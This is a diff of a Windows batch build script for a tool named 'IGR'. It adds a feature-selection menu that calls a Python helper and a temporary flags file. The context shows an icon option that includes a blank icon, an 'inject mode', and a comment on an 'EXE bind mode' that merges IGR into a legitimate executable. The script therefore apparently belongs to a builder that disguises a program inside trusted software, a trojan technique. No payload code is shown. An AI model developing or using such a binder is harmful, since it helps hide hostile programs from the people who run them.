@@ -29,6 +29,24 @@ if "%ICON_CHOICE%"=="2" set "ICON_FLAG=--icon=files\blank.ico"
 if "%ICON_CHOICE%"=="3" set "ICON_FLAG=--icon=files\logos\igr-logo.ico"
 if not defined ICON_FLAG set "ICON_FLAG=--icon=files\blank.ico"
 
+echo.
+echo   Feature Set:
+echo   [1] Full Version    - All features enabled (recommended)
+echo   [2] Manual Select   - Choose which features to include
+echo.
+set /p "FEAT_MODE=Choose feature set (1 or 2): "
+
+if "%FEAT_MODE%"=="1" (
+    echo   All features enabled.
+    python files\feature_select.py --full >nul 2>&1
+    if exist _feat_flags.bat call _feat_flags.bat
+    del /f /q _feat_flags.bat >nul 2>&1
+) else (
+    python files\feature_select.py
+    if exist _feat_flags.bat call _feat_flags.bat
+    del /f /q _feat_flags.bat >nul 2>&1
+)
+
 if "%INJECT_MODE%"=="2" goto :bind_mode
 
 echo.
@@ -256,9 +274,7 @@ echo.
 pause
 exit /b 0
 
-REM ============================================================================
-REM EXE BIND MODE - Merge IGR into a legitimate executable
-REM ============================================================================
+REM exe bind mode
 :bind_mode
 
 echo.
